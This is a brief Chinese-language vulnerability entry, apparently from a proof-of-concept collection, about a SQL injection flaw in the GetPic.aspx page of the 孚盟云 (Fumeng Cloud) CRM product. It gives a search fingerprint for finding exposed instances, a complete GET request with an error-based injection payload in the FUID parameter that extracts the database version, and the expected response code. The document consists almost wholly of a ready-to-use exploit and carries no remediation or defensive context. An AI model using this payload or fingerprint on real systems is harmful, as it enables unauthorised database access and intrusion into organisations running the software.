# 孚盟云GetPic.aspx存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`body="hidLicResult"`
- **请求**：`GET /Common/GetPic.aspx?FUID=-1'and+1=@@VERSION-- HTTP/1.1Host:`
- **响应特征**：200